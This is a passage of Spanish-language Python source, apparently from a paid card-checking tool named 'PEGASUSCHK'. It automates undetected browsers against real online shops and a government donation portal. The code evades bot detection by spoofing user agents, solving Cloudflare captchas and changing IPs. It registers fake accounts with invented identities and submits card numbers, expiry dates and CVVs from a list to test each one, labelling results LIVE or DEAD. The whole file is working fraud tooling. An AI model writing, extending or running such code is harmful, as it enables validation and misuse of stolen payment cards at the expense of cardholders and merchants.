                    sb.type('#cvv', self.cvv[self.cont])
                    sb.switch_to_default_content()

                    sb.wait_for_element('#wc-first-data-clover-credit-card-street-address-hosted > iframe')
                    sb.switch_to_frame('#wc-first-data-clover-credit-card-street-address-hosted > iframe')
                    sb.type('#street-address', address)
                    sb.switch_to_default_content()

                    sb.wait_for_element('#wc-first-data-clover-credit-card-postal-code-hosted > iframe')
                    sb.switch_to_frame('#wc-first-data-clover-credit-card-postal-code-hosted > iframe')
                    sb.type('#postal', '33351')
                    sb.switch_to_default_content()

                    sb.click('#terms')

                    #cf-turnstile-woo-checkout
                    sb.scroll_to('div[id*="cf-turnstile-woo-checkout"]')
                    sb.uc_gui_click_captcha(frame="(//iframe[@title='Widget containing a Cloudflare security challenge'])[1]", retry=False, blind=False)

                    time.sleep(random.uniform(1, 3))

                    sb.click('#place_order')

                    # Analizando resultados

                    if contador == 0:
                        try:
                            sb.click("//button[contains(@class, 'pum-close')]", timeout=5)
                        except Exception as e:
                            print('Error aceptando terminos.', e)

                    msgPay = sb.get_text("//ul[@class='woocommerce-error']/li")
                    print(msgPay)

                    deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                    livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"

                    if self.tools.repetir(livemsg) == True:
                        msgPay = 'RELIVE'
                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                        self.text_dead.emit(deadmsg)
                    else:

                        if 'Street address is not provided' in msgPay:
                            break

                        elif 'SERV NOT ALLOWED' in msgPay:
                            contadorBan = contadorBan + 1

                        elif (brand == '5' or brand == '4') and ('No reason provided' in msgPay or ' Insufficient funds' in msgPay):

                            self.printed.emit(msgPay)
                            self.text_live.emit(livemsg)
                            contadorBan = 0

                        elif brand == '3' and 'No reason provided' in msgPay:
                            self.text_dead.emit(deadmsg)
                            contadorBan = 0

                        # Arreglando mensajes de Dead
                        elif 'cancelled by the issuer' in msgPay or 'bank does not allow' in msgPay or 'cannot be processed' in msgPay:
                            msgPay = msgPay.split(":")[0]
                            deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                            self.text_dead.emit(deadmsg)
                            contadorBan = 0

                        else:
                            self.text_dead.emit(deadmsg)           

                    self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                    self.cont +=1
                    contador +=1

                    sb.switch_to_default_content()
                    sb.refresh()

                    try:
                        sb.click("//button[contains(@class, 'pum-close')]", timeout=5)
                    except Exception as e:
                        print('Error aceptando terminos.', e)

                    time.sleep(random.uniform(2, 4))

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                    break


            except Exception as e:

                print('Error en configuracion de navegador.', e)
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message = (str(exc_type)+' '+str(exc_tb.tb_lineno))+' '+str(link)
                self.printed.emit(error_message)

            self.text_changed.emit('ELIMINANDO RASTREADORES!')

    self.text_changed.emit('TESTEO FINALIZADO')

def Orange_gate(self):

    self.text_changed.emit("INICIANDO GATE ORANGE")

    name = self.first1
    lname = self.last1

    while self.cont < self.total_lines:
        self.text_changed.emit("TESTEANDO...")

        if self.tools.validate_creditos(self.username,self.password) == True:
            self.text_changed.emit('ORBES INSUFICIENTES :/')
            return None
        else:
            self.text_changed.emit('ORBES VALIDADOS.')

        
        username = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.last1
        emailf = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.last1+'@gmail.com'
        conteo = 0

        self.text_changed.emit('INICIANDO CONFIGURACION DE NAVEGADOR')

        with SB(test=False, uc=True, headless2=getHeadless(self)) as sb:

            self.text_changed.emit(f"Configuracion {sb} encontrada.")
            try:
                sb.open("https://www.xvideos.red/")
                self.text_changed.emit('NAVEGADOR CONFIGURADO.')

                try:
                    sb.click("//button[contains(@class, 'disclaimer-enter-btn')]") 
                    sb.click("//a[contains(@class, 'main-slider__item-btn')]")

                except:
                    print('Aviso no encontrado.')

                #WebDriverWait(sb, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="signup-form_login"]'))).send_keys(emailf) #Asi era antes
                sb.type('//*[@id="signup-form_login"]',emailf) #Asi quedo

                #WebDriverWait(sb, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="signup-form_profile_name"]'))).send_keys(username)#Asi era antes
                sb.type('//*[@id="signup-form_profile_name"]',username)  #Asi quedo

                #WebDriverWait(sb, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="signup-form_password"]'))).send_keys('Polka123.')
                sb.type('//*[@id="signup-form_password"]','Polka123.')
                sb.click("//input[@id='signup-form_tos_pp']")

                time.sleep(1)
                
                sb.wait_for_element_clickable("//button[@id='signup-form-submit']", by="xpath")
                sb.click("//button[@id='signup-form-submit']")
                time.sleep(1)

                try: # Revisando error username
                    #WebDriverWait(sb, 10).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="premium-form"]/div[2]/div/button'))).click()
                    sb.click('//*[@id="premium-form"]/div[2]/div/button')
                except:
                    try:
                        self.text_changed.emit('CAMBIANDO USER!')
                        while True:
                            msgUser = sb.wait_for_element('//*[@id="signup-form"]/div[6]/div/div/div/p/a/span')
                            print('ERROR USER', msgUser)
                            if 'profile name' in msgUser or 'nombre de perfil' in msgUser:
                                username = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.last1
                                btnCreate = sb.wait_for_element_clickable('//*[@id="signup-form"]/div[6]/div/div/div/p/a/span')
                                sb.wait_for_element('//*[@id="signup-form"]/div[6]/div/div/div/p/a/span')
                                inputUser = sb.wait_for_element_clickable('//*[@id="signup-form_profile_name"]')
                                inputUser.clear()
                                inputUser.send_keys(username)
                                time.sleep(1)
                                btnCreate.click()
                            else:
                                self.text_changed.emit('ERROR CREANDO CUENTA, REINICIANDO COOKIES!')
                                break
                    except:
                        btnReCreate = sb.wait_for_element_clickable("//button[@id='signup-form-submit']")
                        sb.execute_script("arguments[0].click();", btnReCreate)

                    btnBuy = sb.wait_for_element_clickable("//button[@type='submit' and contains(@class, 'btn-danger')]")
                    sb.execute_script("arguments[0].click();", btnBuy)

                while conteo <=30 and self.cont < self.total_lines:

                    self.text_changed.emit('REALIZANDO PAGO!')
                    ccs, mes, ano, ccn, typ= str(self.ccs[self.cont]).strip() , str(self.mes[self.cont]).strip(), str(self.anio[self.cont]).strip(), str(self.cvv[self.cont]).strip(), self.tools.bintype(self.ccs[self.cont])
                    deadmsg = "DEAD|PEGASUSCHK|ORANGE|%s|%s|%s|%s|%s\n" % (ccs,mes,ano,ccn,typ)
                    livemsg = "LIVE|PEGASUSCHK|ORANGE|%s|%s|%s|%s|%s\n" % (ccs,mes,ano,ccn,typ)

                    

                    btnValidate = sb.wait_for_element_clickable('//*[@id="credit-card-form"]/div[10]/div/button')

                    #WebDriverWait(sb, 20).until(EC.presence_of_element_located((By.XPATH, '//*[@id="credit-card-form"]/div[6]/div[2]/input'))).send_keys('000')
                    sb.type('//*[@id="credit-card-form"]/div[6]/div[2]/input','000')
                    #WebDriverWait(sb, 20).until(EC.presence_of_element_located((By.XPATH, '//*[@id="credit-card-form"]/div[2]/div/input'))).send_keys(name)
                    sb.type('//*[@id="credit-card-form"]/div[2]/div/input',name)
                    #WebDriverWait(sb, 20).until(EC.presence_of_element_located((By.XPATH, '//*[@id="credit-card-form"]/div[3]/div/input'))).send_keys(lname)
                    sb.type('//*[@id="credit-card-form"]/div[3]/div/input',lname)
                    #WebDriverWait(sb, 20).until(EC.presence_of_element_located((By.XPATH, '//*[@id="credit-card-form"]/div[7]/div/input'))).send_keys('110111')
                    sb.type('//*[@id="credit-card-form"]/div[7]/div/input','110111')
                    #WebDriverWait(sb, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="tos"]'))).click()
                    sb.click('//*[@id="tos"]')

                    inputcc = sb.wait_for_element('//*[@id="credit-card-input"]')
                    inputcc.clear()
                    sb.type('//*[@id="credit-card-input"]',self.ccs[self.cont])

                    sb.select_option_by_text('//*[@id="credit-card-form"]/div[5]/div[2]/select',self.mes[self.cont])
                    sb.select_option_by_text('//*[@id="credit-card-form"]/div[5]/div[4]/select',self.anio[self.cont][2:4])
                        
                    time.sleep(1)
                    btnValidate.click()

                    time.sleep(4)

                    # REVISANDO

                    try:
                        sb.wait_for_element_visible('//div[@class="alert alert-danger payment-error"]')
                        #print('DEAD POR LABEL')  
                        self.text_dead.emit(deadmsg)
                    except:
                        try:
                            time.sleep(3)
                            sb.wait_for_element('/html/body/div[3]/div[1]/div[2]/iframe', timeout=10)
                            sb.switch_to_frame('/html/body/div[3]/div[1]/div[2]/iframe')
                            msgFrame = sb.wait_for_element("//body").text
                            ulti = self.ccs[self.cont][-4:]
                            palabras_clave = ["Call me at", "SMS", "EMAIL", "Código de Verificación", "ENVIAR", "Autoriza tu compra en tu banca digital", "Clave OTP", "ingresa el código", ulti]
                            encontrada = any(palabra in msgFrame for palabra in palabras_clave)
                            if encontrada:
                                if self.tools.repetir(ccs) == True:
                                    self.text_dead.emit(deadmsg)
                                else:
                                    self.text_live.emit(livemsg)
                            else:
                                self.text_dead.emit(deadmsg)
                            sb.switch_to.default_content()

                        except: 
                            sb.switch_to.default_content()
                            sb.wait_for_element_clickable('//*[@id="credit-card-form"]/div[10]/div/button')
                            msgDead = sb.wait_for_element('//*[@id="credit-card-form"]/div[1]')
                            #print(msgDead)
                            self.text_dead.emit(deadmsg)

                    #print('Validando creditos')
                    if self.tools.validate_creditos(self.username,self.password) == True:
                        self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                        break

                    sb.refresh()
                    self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                    self.cont+=1
                    conteo +=1

            except:
                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                ##sb.delete_all_cookies()
                #contar = 21

        continue   
    self.text_changed.emit('TESTEO FINALIZADO')

def stripchat(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

            except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')


def falabella(self):

    self.text_changed.emit("Micro Charged | HORIZON")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, incognito=True, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' CALLE ' + str(random.randint(100, 999)) + 'SUR'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])
                passwd = "Pegasus123*"

                links = [
                    
                    'https://www.falabella.com.co/falabella-co/product/125454309/Antena-Tdt-Para-Tv-Smart-Televisor-Inteligente/125454310',
                    'https://www.falabella.com.co/falabella-co/product/132440268/Antena-Tdt-Para-Tv-Smart-Televisor-5-METROS/132440269',
                    'https://www.falabella.com.co/falabella-co/product/132738088/Antena-Digital-Tdt-Con-Base-Magnetica-Y-Cable-De-3M/132738089',
                    'https://www.falabella.com.co/falabella-co/product/126685719/Antena-Tdt-De-36-Decibeles-Potente-Mejor-Senal-Imanada/126685720',
                    'https://www.falabella.com.co/falabella-co/product/135477559/Cargador-Para-Iphone-Carga-Rapida-20w-+-Parlante-7-horas-De-Musica/135477560',
                    'https://www.falabella.com.co/falabella-co/product/126784463/Cargador-Inalambrico-Magsafe-a-USB-C-para-Iphone-Generico/126784464'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())

                try:
                    sb.open(link)

                    try: # Interfaz Mobile
                        sb.wait_for_element("#add-to-cart-button", timeout=10)
                        sb.click("#add-to-cart-button")
                    except:
                        try:
                            sb.wait_for_element("//button[contains(@class, 'button-mkp-primary')]", timeout=5)
                            sb.click("//button[contains(@class, 'button-mkp-primary')]")
                        except:
                            self.text_changed.emit('🚫 La IP actual está bloqueada. Por favor, cambia de IP para continuar tu vuelo con Pegasus. ✨!')
                            time.sleep(120)
                        

                        #sb.click("//div[contains(@class, 'availability-item')]")
                        #time.sleep(random.uniform(1, 2))
                        #sb.select_option_by_value("#geofinder-input-level1", "Antioquia")
                        #time.sleep(random.uniform(1, 2))
                        #sb.select_option_by_value("#geofinder-input-level2", "Bello")
                        #time.sleep(random.uniform(1, 2))
                        #sb.select_option_by_value("#geofinder-input-level3", "Bello")
                        #time.sleep(random.uniform(1, 2))
                    
                    sb.click("#linkButton")

                    sb.open("https://www.falabella.com.co/falabella-co/checkout/delivery")

                    sb.type("#testId-Input-email", email)

                    sb.click("#continueButton")

                    # Address Form
                    sb.wait_for_element("//input[contains(@placeholder, 'Departamento')]")
                    time.sleep(random.uniform(1, 2))
                    sb.press_keys("//input[contains(@placeholder, 'Departamento')]", "ANTIOQUIA")
                    time.sleep(random.uniform(1, 2))
                    sb.click("#testId-Dropdown-ANTIOQUIA")
                    time.sleep(random.uniform(1, 2))
                    sb.type("//input[contains(@placeholder, 'Ciudad')]", "MEDELLÍN")
                    time.sleep(random.uniform(1, 2))
                    sb.click("#testId-Dropdown-MEDELLÍN")
                    time.sleep(random.uniform(1, 2))
                    sb.type("//input[contains(@placeholder, 'Barrio')]", "MEDELLÍN")
                    time.sleep(random.uniform(1, 2))
                    sb.click("#testId-Dropdown-MEDELLÍN")
                    time.sleep(random.uniform(1, 2))
                    sb.type("#testId-Input-street", address)
                    time.sleep(random.uniform(1, 2))
                    sb.click("#testId-infoModalFooter-button")
                    sb.click("#testId-infoModalFooter-button")
                    time.sleep(random.uniform(1, 2))
                    sb.click("//button[contains(text(), 'Confirmar y Guardar')]")

                    sb.click("//button[contains(text(), 'Ir a pagar')]")

                    contador = 0
                    while self.cont < self.total_lines and contador <= 4:

                        self.text_changed.emit('El vuelo de Pegasus ha comenzado... 🐎 Reuniendo sabiduría. ⏳')

                        sb.switch_to_default_content()
                        sb.refresh()

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        brand = self.ccs[self.cont][0:1]
                        binCC = self.ccs[self.cont][0:6]
                        fecha = f"{mes}{ano[2:4]}"

                        deadmsg = f"DEAD|PEGASUSCHK|HORIZON|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|HORIZON|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"

                        try:
                            sb.click("#click_en_abrir", timeout=5)
                        except:
                            pass

                        #FORM PAYMENT
                        sb.click("//div[contains(p, 'Tarjeta de débito')]", timeout=15)

                        try: # Revisando excepciones 
                            sb.wait_for_element("//iframe[contains(@src, 'https://gw.digitalpaymentsspa.com')]")
                            #click_en_abrir
                        except:
                            try:
                                msgBan = sb.get_text("//div[@data-testid='testId-CardOperationFailure']")
                                if " error en el sistema" in msgBan:
                                    self.text_changed.emit('🚨 Para proteger tus datos, limpia tu dispositivo, cambia tu IP y refuerza tu anonimato. ¡Tu seguridad es nuestra prioridad! 🌍🔒')
                                    if not self.username == "ZenoxPav":
                                        time.sleep(120)
                                    break
                                else:
                                    continue
                            except:
                                continue

                        sb.switch_to_frame("//iframe[contains(@src, 'https://gw.digitalpaymentsspa.com')]")

                        sb.type("#pan", self.ccs[self.cont])
                        sb.type("#expDate", fecha)
                        sb.type("#cvv", self.cvv[self.cont])

                        sb.click("#btnConfirm")

                        #sb.switch_to_default_content()

                        try: # Analizando resultados

                            msgPay = sb.get_text("//div[@class='swal2-header']//h2[contains(text(), 'Ha ocurrido un error.')]", timeout=15)
                            print(msgPay)
                            self.text_dead.emit(deadmsg)

                        except Exception as e:

                            try:
                                sb.switch_to_default_content()
                                msgPay = sb.get_text("#testId-AddCardButton")
                                print(msgPay)
                                if "tarjeta" in msgPay:
                                    if self.tools.repetir(livemsg) == True:
                                    
                                        self.dead_disp.emit()
                                        msgPay = 'RELIVE'
                                        deadmsg = f"DEAD|PEGASUSCHK|HORIZON|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                                        self.text_dead.emit(deadmsg)
                                        
                                    else:
                                        self.text_live.emit(livemsg)
                                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                                        self.cont +=1
                                        contador +=1
                                        break
                            

                                try:
                                    msgPay = sb.get_text("//small[contains(@class, 'help-block') and @data-bv-validator='callback' and (contains(text(), 'Año no válido') or contains(text(), 'Fecha no válida'))]")
                                except Exception as e:
                                    msgPay = ""

                                if "no válid" in msgPay:
                                        self.text_dead.emit(deadmsg)
                                        

                                sb.switch_to_default_content()

                                sb.click("//button[contains(text(), 'Continuar')]", timeout=15)

                                sb.type("#testId-Input-name", self.first1)
                                sb.type("#testId-Input-lastName", self.last1)
                                sb.type("#testId-Input-dni", dni)
                                sb.type("#testId-Input-phone", phone_number)
                                sb.type("#testId-Input-password", passwd)
                                
                                time.sleep(random.uniform(1, 2))
                                sb.click("#testId-button-save-user")
                                time.sleep(random.uniform(1, 2))
                                sb.click("#testId-button-save-user")

                                sb.wait_for_element("//button[contains(text(), 'Pagar')]")

                                setCuenta(email, passwd, "FLB")

                            except Exception as e:
                                print("Error en:", e)

                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1

                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:"
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

    
def plantilla(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://www.tintaclubdellibro.com/'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)

                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def payitgov(self):

    self.text_changed.emit("Auth Charged | LEGACY ")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        if self.username == "Lau":
            headless2 = False

        with SB(test=False, incognito=True, uc=True, agent=user_agent, headless2=headless2) as sb:
        #with SB(test=False, incognito=True, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' wall street lake' + str(random.randint(100, 999)) + ' Rd'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])
                tipo_cambio = 4000  # Actualiza esto según el tipo de cambio actual
                valor_usd = random.randint(4000, 10000) / tipo_cambio

                links = [
                    'https://pay.payitgov.com/ncdonations'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)

                    sb.type("#first-name", self.first1)
                    time.sleep(random.uniform(1, 2))
                    sb.type("#last-name", self.last1)
                    time.sleep(random.uniform(1, 2))
                    sb.type("#email-address", email)
                    time.sleep(random.uniform(1, 2))
                    sb.type("#phone-number", phone_number)
                    time.sleep(random.uniform(1, 2))
                    sb.type("#street-address", address)
                    time.sleep(random.uniform(1, 2))
                    sb.type("#city", "Sunrise")
                    time.sleep(random.uniform(1, 2))
                    sb.select_option_by_value("#adminDivision1", "13")
                    time.sleep(random.uniform(1, 2))
                    sb.type("#postcode", "33351")
                    time.sleep(random.uniform(1, 2))
                    sb.type("#payment-amount", valor_usd)
                    time.sleep(random.uniform(1, 2))
                    try: #Pausa proteccion.
                        sb.wait_for_element("body > div > div > div > div > form > div > div:nth-child(12) > div > div:nth-child(1) > button", timeout=15)
                    except Exception as e:
                        print("Error en boton de pago.")
                    sb.click("body > div > div > div > div > form > div > div:nth-child(12) > div > div:nth-child(1) > button")
                    time.sleep(random.uniform(1, 2))

                    sb.wait_for_element("body > iframe")
                    time.sleep(random.uniform(1, 3))
                    sb.switch_to_frame("body > iframe")
                    time.sleep(random.uniform(1, 3))
                    sb.wait_for_element("body > iframe")
                    time.sleep(random.uniform(1, 3))
                    sb.switch_to_frame("body > iframe")
                    time.sleep(random.uniform(1, 3))
                    sb.click("//button[contains(text(), 'Continuar')]")
                    time.sleep(random.uniform(1, 2))
                    sb.switch_to_default_content()
                    sb.wait_for_element("body > iframe")
                    time.sleep(random.uniform(1, 3))
                    sb.switch_to_frame("body > iframe")
                    time.sleep(random.uniform(1, 2))
                    sb.click("//button[contains(text(), 'Method')]")
                    time.sleep(random.uniform(1, 2))

                    contador = 0
                    while self.cont < self.total_lines and contador <= 15:

                        sb.click("//button[contains(text(), 'Card')]")
                        time.sleep(random.uniform(1, 2))
                        sb.wait_for_element("//iframe[contains(@name, 'payitAddPaymentMethodIFrame')]")
                        time.sleep(random.uniform(1, 3))
                        sb.switch_to_frame("//iframe[contains(@name, 'payitAddPaymentMethodIFrame')]")
                          
                        # Inicio testeo

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        brand = self.ccs[self.cont][0:1]
                        binCC = self.ccs[self.cont][0:6]

